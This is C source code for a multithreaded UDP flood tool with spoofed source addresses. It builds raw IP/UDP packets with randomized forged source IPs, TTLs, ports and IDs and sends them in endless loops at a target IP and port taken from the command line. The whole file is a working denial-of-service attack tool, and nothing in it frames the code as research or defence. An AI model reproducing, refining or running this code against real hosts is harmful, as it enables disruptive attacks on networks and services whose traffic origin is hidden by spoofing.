#include <time.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

#define PHI 0x9e3779b9
#define MAXPPS 2000000
volatile uint32_t ipaddresses[MAXPPS];
volatile unsigned int sequences[MAXPPS];
volatile unsigned int pids[MAXPPS];
volatile int fvports[MAXPPS];
volatile int fvttl[MAXPPS];
volatile int currentsec = 0;
volatile int countip = 0;

static uint32_t Q[4096], c = 362436;

struct thread_data
{
    int thread_id;
    struct sockaddr_in sin;
};

struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

void init_rand(uint32_t x)
{
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
    printf("Thread %i started\n", td->thread_id);
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (s == -1){
        perror("Failed to create raw socket");
        exit(1);
    }
    uint32_t random_num;
    uint32_t ul_dst;
    init_rand(time(NULL));
    int sent, sent_size;
    struct sockaddr_in servaddr = td->sin;

    char datagram[512], *data, *pseudogram;
    memset(datagram, 0, 512);
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin = td->sin;
    struct pseudo_header psh;
    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->protocol = 17;
    iph->check = 0;
    iph->daddr = sin.sin_addr.s_addr;
    psh.dest_address = sin.sin_addr.s_addr;
    udph->dest = sin.sin_port;
    psh.placeholder = 0;
    psh.protocol = 17;
    int attls[13] = {188, 154, 178, 164};
    while (1)
    {
        if (currentsec == (int)time(NULL)){
            if (countip >= MAXPPS)
                continue;
            countip = countip + 1;
            sequences[countip] = sequences[countip] + 1;
            if (ipaddresses[countip] == 0){
                random_num = rand_cmwc();
                ipaddresses[countip] = (random_num >> 24 & 0xFF) << 24 | (random_num >> 16 & 0xFF) << 16 | (random_num >> 8 & 0xFF) << 8 | (random_num & 0xFF);

                fvttl[countip] = (rand_cmwc() & 0x2 > 1 ? attls[(rand_cmwc() & 0x3)] + (rand_cmwc() & 0x4) : attls[(rand_cmwc() & 0x3)] - (rand_cmwc() & 0x7));
                fvports[countip] = random_num & 0xFFFF;
                ipaddresses[countip] = rand_cmwc() % 0xFFFFFFFF;
                if (ipaddresses[countip] == 0){
                    continue;
                }
            }
            if (pids[countip] == 0){
                pids[countip] = rand_cmwc() % 0xFFFF;
            }
        }else{
            currentsec = (int)time(NULL);
            countip = 0;
            continue;
        }
        unsigned char strdata1[2048 + 1];
        while (strlen(strdata1) < 20 + (rand_cmwc() % 0x50))
        {
            sprintf(strdata1, "%s%c", strdata1, rand_cmwc() % 0x7F);
        }
        strcpy(data, strdata1);
        memset(strdata1, 0, strlen(strdata1));
        random_num = rand_cmwc();

        iph->saddr = ipaddresses[countip];

        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);
        iph->id = pids[countip];
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        iph->ttl = fvttl[countip];
        iph->frag_off = (random_num & 0x04 < 3 ? htons(0 | IP_DF) : 0);

        udph->source = fvports[countip];
        udph->len = htons(8 + strlen(data));
        udph->check = 0;

        psh.source_address = ipaddresses[countip];
        psh.udp_length = htons(sizeof(struct udphdr) + strlen(data));

        int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
        pseudogram = malloc(psize);

        memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + strlen(data));

        udph->check = csum((unsigned short *)pseudogram, psize);
        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
            // Packet not sent
        }
    }
    sleep(1);
}

int main(int argc, char *argv[])
{
    if (argc < 4)
    {
        printf("Invalid parameters!\n");
        printf("UFWSI\n");
        printf("Usage: %s <IP> <Port> <threads> <time (optional)>\n", argv[0]);
        exit(-1);
    }

    fprintf(stdout, "Setting up Sockets...\n");

    unsigned int vc_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    pthread_t thread[num_threads];
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    sin.sin_port = htons(vc_port);

    struct thread_data td[num_threads];
    int sx = 0;
    int i = 0;
    int countwin = 0;
    int countlin = 0;
    for (i = 0; i < MAXPPS; i++)
    {
        ipaddresses[i] = 0;
        sequences[i] = 0;
        pids[i] = 0;
    }
    for (i = 0; i < num_threads; i++)
    {
        sx++;
        td[i].thread_id = i;
        td[i].sin = sin;
        pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
    }
    fprintf(stdout, "Starting Flood...\n");
    if (argc > 4)
    {
        sleep(atoi(argv[4]));
    }
    else
    {
        while (1)
        {
        }
    }

    return 0;
}